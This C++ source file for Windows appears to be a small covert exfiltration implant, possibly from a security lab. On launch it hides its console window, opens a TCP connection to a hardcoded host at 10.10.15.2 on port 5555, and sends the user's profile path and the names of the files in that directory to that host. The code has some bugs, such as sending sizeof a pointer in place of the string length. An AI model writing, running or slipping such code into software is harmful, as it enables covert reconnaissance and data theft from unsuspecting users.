#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>


char* userDirectory() {
    char* pPath;
    pPath = getenv("USERPROFILE");

    if (pPath!=NULL) {
        return pPath;
    }
    else {
        perror("");
    }
}


int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;
  
    // MAKEWORD is a macro, in this case it is version 2.0. &WSAData is address of WSA structure.
    WSAStartup(MAKEWORD(2, 0), &WSAData);
    
    // establish socket connection
    server = socket(AF_INET, SOCK_STREAM, 0);

    
    addr.sin_addr.s_addr = inet_addr("10.10.15.2"); // inet_addr converts string literal to correct data type
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555); // Convert port to network type (not computer type)

    // sizeof(addr) -> calculates size of IP:Port pair (ref: https://docs.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-sockaddr_in)
    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    char* pPath = userDirectory();
    send(server, pPath, sizeof(pPath), 0);
    send(server, "\n", 1, 0);

    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(pPath)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            send(server, ent->d_name, sizeof(ent->d_name), 0);
            send(server, "\n", 1, 0);
            memset(ent->d_name, 0, sizeof(ent->d_name));
        }
        closedir(dir);
    }
    else {
        perror("");
    }

    closesocket(server);
    WSACleanup();
}
